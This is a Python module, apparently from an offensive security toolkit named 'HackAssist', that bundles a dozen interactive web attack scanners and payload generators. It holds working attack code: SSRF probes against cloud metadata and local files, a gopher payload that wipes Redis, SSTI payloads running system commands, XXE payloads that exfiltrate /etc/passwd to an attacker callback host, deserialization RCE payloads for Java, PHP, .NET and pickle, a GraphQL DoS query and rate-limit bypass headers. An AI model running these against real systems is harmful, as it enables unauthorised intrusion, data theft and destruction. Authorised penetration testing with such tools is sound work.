"""Web Vulnerability Scanners — SSRF, CORS, Subdomain Takeover, SSTI,
XXE, Race Condition, WebSocket, GraphQL, Deserialization, Rate Limit Bypass.

Compact module combining all web-specific attack scanners.
"""

import sys, os, re, time, json, base64, threading
import urllib.request, urllib.parse, urllib.error

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel)
from executor import run_command, run_with_preview
from session import save_finding

# ═══════════════════════════════════════════════════════════════════════════════
# SSRF Scanner
# ═══════════════════════════════════════════════════════════════════════════════

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://[::1]",
    "http://0.0.0.0", "http://0177.0.0.1", "http://2130706433",
    "http://127.1", "http://0x7f000001",
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://169.254.169.254/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance",  # Azure
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba
    "file:///etc/passwd", "file:///etc/hosts",
    "dict://127.0.0.1:6379/INFO",  # Redis
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
]


def _ssrf_scan(session):
    console.print("\n[bold cyan]SSRF Scanner[/bold cyan]\n")
    url = ask("Target URL with parameter (e.g. http://target/fetch?url=)")
    param = ask("Vulnerable parameter name", default="url")

    console.print(f"\n[bold]Testing {len(SSRF_PAYLOADS)} SSRF payloads...[/bold]\n")

    for payload in SSRF_PAYLOADS:
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            req = urllib.request.Request(test_url, headers={"User-Agent": "HackAssist/1.0"})
            resp = urllib.request.urlopen(req, timeout=5)
            body = resp.read().decode(errors='replace')[:500]

            if any(x in body for x in ["root:", "localhost", "ami-id", "instance-id", "computeMetadata"]):
                error(f"  [SSRF!] {payload}")
                console.print(f"    [red]Response: {body[:200]}[/red]")
                if session:
                    save_finding(session, "ssrf", f"SSRF: {payload}", "critical", body[:500])
            else:
                console.print(f"  [dim]{payload} — no indicator[/dim]")
        except Exception:
            console.print(f"  [dim]{payload} — error/blocked[/dim]")


# ═══════════════════════════════════════════════════════════════════════════════
# CORS Scanner
# ═══════════════════════════════════════════════════════════════════════════════

def _cors_scan(session):
    console.print("\n[bold cyan]CORS Misconfiguration Scanner[/bold cyan]\n")
    url = ask("Target URL")

    origins = [
        "https://evil.com", "https://attacker.com",
        f"https://{urllib.parse.urlparse(url).hostname}.evil.com",
        "null", "https://localhost", "http://127.0.0.1",
    ]

    console.print(f"\n[bold]Testing CORS with {len(origins)} origins...[/bold]\n")

    for origin in origins:
        try:
            req = urllib.request.Request(url)
            req.add_header("Origin", origin)
            resp = urllib.request.urlopen(req, timeout=5)
            acao = resp.getheader("Access-Control-Allow-Origin", "")
            acac = resp.getheader("Access-Control-Allow-Credentials", "")

            if acao:
                if acao == "*":
                    warning(f"  Origin: {origin} → ACAO: * (wildcard)")
                elif origin in acao:
                    error(f"  [VULN!] Origin: {origin} → ACAO: {acao} | Credentials: {acac}")
                    if acac.lower() == "true":
                        error("    ⚠ CRITICAL: Credentials allowed with reflected origin!")
                        if session:
                            save_finding(session, "cors", f"CORS with credentials: {url}",
                                         "critical", f"Origin {origin} reflected with credentials")
                else:
                    console.print(f"  [dim]Origin: {origin} → ACAO: {acao}[/dim]")
        except Exception:
            console.print(f"  [dim]{origin} — error[/dim]")


# ═══════════════════════════════════════════════════════════════════════════════
# Subdomain Takeover
# ═══════════════════════════════════════════════════════════════════════════════

TAKEOVER_FINGERPRINTS = {
    "GitHub Pages": "There isn't a GitHub Pages site here",
    "Heroku": "No such app",
    "AWS S3": "NoSuchBucket",
    "Shopify": "Sorry, this shop is currently unavailable",
    "Tumblr": "There's nothing here.",
    "WordPress.com": "Do you want to register",
    "Fastly": "Fastly error: unknown domain",
    "Pantheon": "The gods are wise",
    "Zendesk": "Help Center Closed",
    "Unbounce": "The requested URL was not found",
    "Surge.sh": "project not found",
    "Fly.io": "404 Not Found",
}


def _subdomain_takeover(session):
    console.print("\n[bold cyan]Subdomain Takeover Scanner[/bold cyan]\n")
    target = ask("Domain (or file with subdomains, one per line)")

    subdomains = []
    if os.path.exists(target):
        with open(target) as f:
            subdomains = [l.strip() for l in f if l.strip()]
    else:
        info("Discovering subdomains first...")
        code, out, _ = run_command(f"dig {target} CNAME +short", timeout=10)
        subdomains = [target]

    for sub in subdomains:
        # Check CNAME
        code, cname_out, _ = run_command(f"dig {sub} CNAME +short", timeout=5)
        cname = cname_out.strip()

        if cname:
            console.print(f"  [yellow]{sub}[/yellow] → CNAME: {cname}")
            # Try to access and check for takeover fingerprints
            try:
                req = urllib.request.Request(f"http://{sub}",
                                            headers={"User-Agent": "HackAssist/1.0"})
                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read().decode(errors='replace')

                for service, fingerprint in TAKEOVER_FINGERPRINTS.items():
                    if fingerprint in body:
                        error(f"  [TAKEOVER!] {sub} → {service}")
                        if session:
                            save_finding(session, "takeover", f"Subdomain takeover: {sub}",
                                         "critical", f"Service: {service}, CNAME: {cname}")
            except urllib.error.HTTPError as e:
                if e.code == 404:
                    try:
                        body = e.read().decode(errors='replace')
                        for service, fingerprint in TAKEOVER_FINGERPRINTS.items():
                            if fingerprint in body:
                                error(f"  [TAKEOVER!] {sub} → {service} (404)")
                    except Exception:
                        pass
            except Exception:
                console.print(f"  [dim]{sub} — connection failed (dangling CNAME?)[/dim]")
        else:
            console.print(f"  [dim]{sub} — no CNAME[/dim]")


# ═══════════════════════════════════════════════════════════════════════════════
# Template Injection (SSTI)
# ═══════════════════════════════════════════════════════════════════════════════

SSTI_PAYLOADS = {
    "Jinja2 (Python)": [
        ("{{7*7}}", "49"), ("{{config}}", "Config"),
        ("{{self.__class__.__mro__}}", "class"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "subclasses"),
    ],
    "Twig (PHP)": [
        ("{{7*7}}", "49"), ("{{dump(app)}}", "app"),
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}", ""),
    ],
    "Freemarker (Java)": [
        ("${7*7}", "49"), ("<#assign ex='freemarker.template.utility.Execute'?new()>", ""),
    ],
    "Velocity (Java)": [
        ("#set($x=7*7)$x", "49"),
    ],
    "ERB (Ruby)": [
        ("<%= 7*7 %>", "49"), ("<%= system('id') %>", "uid"),
    ],
    "Smarty (PHP)": [
        ("{php}echo 7*7;{/php}", "49"), ("{math equation='7*7'}", "49"),
    ],
}


def _ssti_scan(session):
    console.print("\n[bold cyan]SSTI Scanner[/bold cyan]\n")
    url = ask("Target URL")
    param = ask("Parameter to test")
    method = ask("Method", default="GET")

    console.print(f"\n[bold]Testing SSTI payloads...[/bold]\n")

    for engine, payloads in SSTI_PAYLOADS.items():
        for payload, indicator in payloads:
            try:
                if method.upper() == "GET":
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    req = urllib.request.Request(test_url)
                else:
                    data = urllib.parse.urlencode({param: payload}).encode()
                    req = urllib.request.Request(url, data=data)

                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read().decode(errors='replace')

                if indicator and indicator in body:
                    error(f"  [SSTI!] {engine}: {payload}")
                    if session:
                        save_finding(session, "ssti", f"SSTI ({engine}): {url}",
                                     "critical", f"Payload: {payload}")
                    break
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════════════════════
# XXE Exploiter
# ═══════════════════════════════════════════════════════════════════════════════

XXE_PAYLOADS = {
    "File Read (Linux)": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    "File Read (Windows)": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
    "SSRF via XXE": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{attacker}/xxe">]><foo>&xxe;</foo>',
    "OOB Exfil": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{attacker}/evil.dtd">%xxe;]><foo></foo>',
    "Parameter Entity": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{attacker}/?d=%file;\'>">%eval;%exfil;]>',
    "XInclude": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    "SVG XXE": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
}


def _xxe_scan(session):
    console.print("\n[bold cyan]XXE Exploit Generator[/bold cyan]\n")
    console.print("[bold]Available XXE payloads:[/bold]\n")
    for name, payload in XXE_PAYLOADS.items():
        console.print(f"  [bold yellow]{name}:[/bold yellow]")
        console.print(f"    [white]{payload[:150]}[/white]\n")

    if confirm("Generate custom XXE payload?"):
        attacker = ask("Your callback URL/IP")
        target_file = ask("File to read", default="/etc/passwd")
        payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target_file}">]><foo>&xxe;</foo>'
        console.print(f"\n[bold green]Custom Payload:[/bold green]")
        console.print(f"  {payload}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# Race Condition Tester
# ═══════════════════════════════════════════════════════════════════════════════

def _race_condition(session):
    console.print("\n[bold cyan]Race Condition Tester[/bold cyan]\n")
    url = ask("Target URL")
    method = ask("Method", default="POST")
    data = ask("POST data (or empty for GET)")
    threads = int(ask("Number of parallel requests", default="20"))

    results = {"success": 0, "fail": 0, "codes": {}}
    lock = threading.Lock()

    def send_request():
        try:
            if data:
                req = urllib.request.Request(url, data=data.encode(), method=method)
            else:
                req = urllib.request.Request(url, method=method)
            req.add_header("User-Agent", "HackAssist/1.0")
            resp = urllib.request.urlopen(req, timeout=10)
            code = resp.getcode()
            with lock:
                results["success"] += 1
                results["codes"][code] = results["codes"].get(code, 0) + 1
        except urllib.error.HTTPError as e:
            with lock:
                results["fail"] += 1
                results["codes"][e.code] = results["codes"].get(e.code, 0) + 1
        except Exception:
            with lock:
                results["fail"] += 1

    info(f"Sending {threads} parallel requests...")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_request)
        thread_list.append(t)

    # Start all at once for maximum race condition impact
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join(timeout=15)

    console.print(f"\n[bold green]Results:[/bold green]")
    console.print(f"  Success: {results['success']} | Fail: {results['fail']}")
    console.print(f"  Status codes: {results['codes']}")
    if len(results["codes"]) > 1:
        warning("  Multiple status codes — possible race condition!")


# ═══════════════════════════════════════════════════════════════════════════════
# GraphQL Attacker
# ═══════════════════════════════════════════════════════════════════════════════

GRAPHQL_INTROSPECTION = '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'

def _graphql_attack(session):
    console.print("\n[bold cyan]GraphQL Attacker[/bold cyan]\n")
    url = ask("GraphQL endpoint URL")

    options = [
        ("1", "Introspection Query"),
        ("2", "Schema Dump"),
        ("3", "Batch Query DoS Test"),
        ("4", "Auth Bypass Probes"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        info("Running introspection query...")
        try:
            req = urllib.request.Request(url, data=GRAPHQL_INTROSPECTION.encode(),
                                         method="POST",
                                         headers={"Content-Type": "application/json"})
            resp = urllib.request.urlopen(req, timeout=10)
            body = json.loads(resp.read())
            if "data" in body and "__schema" in body["data"]:
                types = body["data"]["__schema"]["types"]
                success(f"Introspection enabled! Found {len(types)} types:")
                for t in types[:20]:
                    fields = [f["name"] for f in (t.get("fields") or [])]
                    console.print(f"  [yellow]{t['name']}[/yellow] → {', '.join(fields[:5])}")
                if session:
                    save_finding(session, "graphql", "GraphQL introspection enabled", "medium",
                                 f"{len(types)} types exposed")
            else:
                warning("Introspection may be disabled")
        except Exception as e:
            error(f"Failed: {e}")
    elif choice == "3":
        depth = int(ask("Query nesting depth", default="10"))
        nested = '{ __typename ' + '{ __typename ' * depth + '}' * depth + '}'
        query = json.dumps({"query": nested})
        info("Sending deeply nested query...")
        try:
            req = urllib.request.Request(url, data=query.encode(), method="POST",
                                         headers={"Content-Type": "application/json"})
            start = time.time()
            resp = urllib.request.urlopen(req, timeout=30)
            elapsed = time.time() - start
            if elapsed > 5:
                warning(f"Response took {elapsed:.1f}s — possible DoS vector!")
            else:
                info(f"Response in {elapsed:.1f}s")
        except Exception as e:
            error(f"Failed: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# WebSocket Tester
# ═══════════════════════════════════════════════════════════════════════════════

def _websocket_test(session):
    console.print("\n[bold cyan]WebSocket Tester[/bold cyan]\n")
    warning("Requires 'websocket-client' package: pip3 install websocket-client")
    url = ask("WebSocket URL (ws:// or wss://)")
    
    console.print(f"\n[bold]Testing connection to {url}...[/bold]\n")
    try:
        import websocket
        ws = websocket.create_connection(url, timeout=10)
        success("WebSocket connected!")
        
        # Interactive mode
        console.print("[dim]Type messages to send. 'exit' to close.[/dim]\n")
        while True:
            msg = ask("Send")
            if msg.lower() == "exit":
                break
            ws.send(msg)
            try:
                result = ws.recv()
                console.print(f"  [green]Received:[/green] {result[:500]}")
            except Exception:
                warning("No response received")
        ws.close()
    except ImportError:
        error("websocket-client not installed. Install: pip3 install websocket-client")
    except Exception as e:
        error(f"Connection failed: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# Deserialization Scanner
# ═══════════════════════════════════════════════════════════════════════════════

DESER_PAYLOADS = {
    "Java (ysoserial)": {
        "CommonsCollections1": "java -jar ysoserial.jar CommonsCollections1 '{cmd}'",
        "CommonsCollections5": "java -jar ysoserial.jar CommonsCollections5 '{cmd}'",
        "Spring1": "java -jar ysoserial.jar Spring1 '{cmd}'",
    },
    "PHP": {
        "Unserialize": 'O:8:"stdClass":1:{s:4:"test";s:2:"id";}',
        "POP Chain": 'a:1:{i:0;O:4:"Evil":1:{s:3:"cmd";s:2:"id";}}',
    },
    ".NET": {
        "ObjectDataProvider": '<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="clr-namespace:System.Diagnostics;assembly=system" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"><ObjectDataProvider x:Key="" ObjectType="{{x:Type d:Process}}" MethodName="Start"><ObjectDataProvider.MethodParameters><s:String xmlns:s="clr-namespace:System;assembly=mscorlib">cmd</s:String><s:String xmlns:s="clr-namespace:System;assembly=mscorlib">/c {cmd}</s:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>',
    },
    "Python (Pickle)": {
        "RCE": "import pickle, base64, os; print(base64.b64encode(pickle.dumps(type('X',(object,),{'__reduce__':lambda self:(__import__('os').system,('{cmd}',))})())))  ",
    },
}


def _deser_scan(session):
    console.print("\n[bold cyan]Deserialization Payload Generator[/bold cyan]\n")
    for lang, payloads in DESER_PAYLOADS.items():
        console.print(f"\n  [bold yellow]{lang}:[/bold yellow]")
        for name, payload in payloads.items():
            console.print(f"    [bold]{name}:[/bold]")
            console.print(f"      [dim]{payload[:150]}[/dim]")


# ═══════════════════════════════════════════════════════════════════════════════
# API Key Scanner
# ═══════════════════════════════════════════════════════════════════════════════

API_KEY_PATTERNS = {
    "AWS Access Key": r'AKIA[0-9A-Z]{16}',
    "AWS Secret Key": r'(?i)aws(.{0,20})?(?-i)[\'"][0-9a-zA-Z/+]{40}[\'"]',
    "GitHub Token": r'gh[pousr]_[A-Za-z0-9_]{36}',
    "Google API": r'AIza[0-9A-Za-z\-_]{35}',
    "Slack Token": r'xox[baprs]-[0-9a-zA-Z]{10,48}',
    "Private Key": r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----',
    "JWT": r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
    "Generic API Key": r'(?i)(api_key|apikey|api-key)\s*[=:]\s*[\'"]?([A-Za-z0-9_\-]{20,})[\'"]?',
    "Generic Secret": r'(?i)(secret|password|passwd|token)\s*[=:]\s*[\'"]?([^\s\'"]{8,})[\'"]?',
    "Stripe Key": r'sk_live_[0-9a-zA-Z]{24}',
    "Twilio": r'SK[0-9a-fA-F]{32}',
    "SendGrid": r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',
    "Firebase": r'[a-z0-9-]+\.firebaseio\.com',
}


def _api_key_scan(session):
    console.print("\n[bold cyan]API Key / Secret Scanner[/bold cyan]\n")
    target = ask("Path to scan (file or directory)")

    if not os.path.exists(target):
        error(f"Path not found: {target}")
        return

    if os.path.isfile(target):
        files = [target]
    else:
        files = []
        for root, dirs, filenames in os.walk(target):
            dirs[:] = [d for d in dirs if d not in {'.git', 'node_modules', '__pycache__', 'vendor', '.venv'}]
            for f in filenames:
                if f.endswith(('.py', '.js', '.ts', '.env', '.yml', '.yaml', '.json',
                               '.xml', '.conf', '.cfg', '.ini', '.sh', '.php', '.rb',
                               '.go', '.java', '.cs', '.txt', '.md', '.html')):
                    files.append(os.path.join(root, f))

    console.print(f"[dim]Scanning {len(files)} files...[/dim]\n")
    total_found = 0

    for filepath in files:
        try:
            with open(filepath, 'r', errors='replace') as f:
                content = f.read()
            for name, pattern in API_KEY_PATTERNS.items():
                matches = re.findall(pattern, content)
                if matches:
                    for match in matches[:3]:
                        match_str = match if isinstance(match, str) else match[0] if match else ""
                        if len(match_str) > 6:
                            error(f"  [{name}] {filepath}:")
                            console.print(f"    [red]{match_str[:80]}[/red]")
                            total_found += 1
        except Exception:
            pass

    console.print(f"\n[bold]Total secrets found: {total_found}[/bold]")
    if session and total_found:
        save_finding(session, "secrets", f"API keys/secrets found in {target}",
                     "high", f"{total_found} potential secrets detected")


# ═══════════════════════════════════════════════════════════════════════════════
# Supply Chain Auditor
# ═══════════════════════════════════════════════════════════════════════════════

def _supply_chain_audit(session):
    console.print("\n[bold cyan]Supply Chain Auditor[/bold cyan]\n")
    options = [
        ("1", "Audit npm packages (package.json)"),
        ("2", "Audit pip packages (requirements.txt)"),
        ("3", "Check for typosquatting"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        path = ask("Path to project directory")
        run_with_preview(f"cd '{path}' && npm audit 2>/dev/null || echo 'npm audit not available'",
                         session, "supply_chain")
    elif choice == "2":
        path = ask("Path to requirements.txt")
        run_with_preview(f"pip3 install safety 2>/dev/null; safety check -r '{path}'",
                         session, "supply_chain")
    elif choice == "3":
        pkg = ask("Package name to check")
        typosquats = [
            pkg.replace("-", ""), pkg + "s", pkg[:-1], pkg + "1",
            pkg.replace("_", "-"), pkg.replace("-", "_"),
        ]
        console.print(f"\n[bold]Potential typosquat names for '{pkg}':[/bold]\n")
        for t in typosquats:
            if t != pkg:
                console.print(f"  [yellow]{t}[/yellow]")


# ═══════════════════════════════════════════════════════════════════════════════
# Rate Limit Bypasser
# ═══════════════════════════════════════════════════════════════════════════════

def _rate_limit_bypass(session):
    console.print("\n[bold cyan]Rate Limit Bypass Techniques[/bold cyan]\n")
    url = ask("Target URL")

    headers_to_try = [
        ("X-Forwarded-For", ["127.0.0.1", "10.0.0.1", "192.168.1.1"]),
        ("X-Real-IP", ["127.0.0.1"]),
        ("X-Originating-IP", ["127.0.0.1"]),
        ("X-Client-IP", ["127.0.0.1"]),
        ("X-Remote-IP", ["127.0.0.1"]),
        ("X-Remote-Addr", ["127.0.0.1"]),
        ("True-Client-IP", ["127.0.0.1"]),
        ("CF-Connecting-IP", ["127.0.0.1"]),
    ]

    console.print("[bold]Testing header-based bypass...[/bold]\n")
    for header, values in headers_to_try:
        for value in values:
            try:
                req = urllib.request.Request(url)
                req.add_header(header, value)
                resp = urllib.request.urlopen(req, timeout=5)
                code = resp.getcode()
                console.print(f"  {header}: {value} → [green]{code}[/green]")
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    console.print(f"  {header}: {value} → [red]{e.code} (rate limited)[/red]")
                else:
                    console.print(f"  {header}: {value} → [yellow]{e.code}[/yellow]")
            except Exception:
                console.print(f"  {header}: {value} → [dim]error[/dim]")

    console.print("\n[bold yellow]Other bypass techniques:[/bold yellow]")
    console.print("  • Add random query params: ?t=1, ?t=2")
    console.print("  • Change User-Agent per request")
    console.print("  • Use HTTP/1.0 vs HTTP/1.1")
    console.print("  • Add line terminators: %0d%0a")
    console.print("  • Case change in path: /Api vs /api vs /API")
    console.print("  • URL encode path: /%61pi")


# ═══════════════════════════════════════════════════════════════════════════════
# Main Menu
# ═══════════════════════════════════════════════════════════════════════════════

def run(session, module="main"):
    """Entry point — can target specific scanner or show full menu."""
    show_stage_header("Web Vulnerability Scanners",
                      "SSRF, CORS, Takeover, SSTI, XXE, Race, GraphQL, WebSocket")

    while True:
        options = [
            ("", "[bold white]── INJECTION ──[/bold white]"),
            ("1", "[bold]SSRF Scanner[/bold] — Server-side request forgery"),
            ("2", "[bold]SSTI Scanner[/bold] — Template injection (Jinja2/Twig/etc)"),
            ("3", "[bold]XXE Exploiter[/bold] — XML external entity"),
            ("4", "[bold]Deserialization[/bold] — Java/PHP/.NET payload gen"),
            ("", "[bold white]── LOGIC ──[/bold white]"),
            ("5", "[bold]CORS Scanner[/bold] — Misconfiguration detection"),
            ("6", "[bold]Race Condition[/bold] — Parallel request tester"),
            ("7", "[bold]Rate Limit Bypass[/bold] — Header rotation bypass"),
            ("", "[bold white]── API / PROTOCOL ──[/bold white]"),
            ("8", "[bold]GraphQL Attacker[/bold] — Introspection, DoS, batching"),
            ("9", "[bold]WebSocket Tester[/bold] — Connect, send, fuzz"),
            ("", "[bold white]── DOMAIN ──[/bold white]"),
            ("10", "[bold]Subdomain Takeover[/bold] — Dangling CNAME detection"),
            ("", "[bold white]── SECRETS ──[/bold white]"),
            ("11", "[bold]API Key Scanner[/bold] — Find leaked secrets in code"),
            ("12", "[bold]Supply Chain Audit[/bold] — Dependency vulnerability check"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1": _ssrf_scan(session)
        elif choice == "2": _ssti_scan(session)
        elif choice == "3": _xxe_scan(session)
        elif choice == "4": _deser_scan(session)
        elif choice == "5": _cors_scan(session)
        elif choice == "6": _race_condition(session)
        elif choice == "7": _rate_limit_bypass(session)
        elif choice == "8": _graphql_attack(session)
        elif choice == "9": _websocket_test(session)
        elif choice == "10": _subdomain_takeover(session)
        elif choice == "11": _api_key_scan(session)
        elif choice == "12": _supply_chain_audit(session)
